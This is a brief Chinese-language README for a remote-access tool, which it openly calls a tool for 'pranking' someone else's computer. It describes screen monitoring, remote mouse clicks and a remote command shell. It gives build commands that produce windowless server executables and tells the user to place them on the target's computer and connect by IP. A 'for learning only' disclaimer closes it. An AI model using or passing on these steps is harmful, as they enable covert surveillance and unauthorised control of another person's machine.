# 这是机惨工具(或远控)



## 功能：

屏幕监控

鼠标单击
（键盘需配合屏幕键盘）

远程cmd


## 怎么使用：

```cmd
pip install pyinstaller
pip install pyautogui
pyinstaller -F -w server2.py
pyinstaller -F -w cmdserver.py
```
把编译好的server2.exe和cmdserver.exe放进对方电脑里

在client2.py中的server_address 改成(对方ip, 10000)

在cmdclient.py中的ADDR 改成对方ip

运行client2.py和cmdclient.py，开始机惨！！！

## 注意：

此软件仅供学习使用，严禁用于非法用途！！！！！！
